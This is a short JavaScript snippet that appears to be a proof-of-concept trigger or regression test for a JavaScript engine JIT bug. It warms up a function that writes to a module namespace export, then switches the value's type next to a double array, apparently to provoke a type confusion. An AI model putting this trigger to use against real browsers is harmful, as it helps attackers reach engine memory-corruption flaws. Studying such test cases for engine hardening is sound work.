(async () => {
    const module_source = 'data:text/javascript,export let a,b,c,d,e,f,g,h;';
    const m = await import(module_source);
    const victim_array = [1.1, 2.2];
    let trigger_bug = false;

    function vulnerable_path() {
        if (trigger_bug) {
            m.a = 1.1;
        } else {
            m.a = 1;
        }
    }

    for (let i = 0; i < 25000; i++) {
        try {
            vulnerable_path();
        } catch (e) {}
    }

    trigger_bug = true;
    try {
        vulnerable_path();
    } catch (e) {}

    victim_array[0];
})().catch(() => {});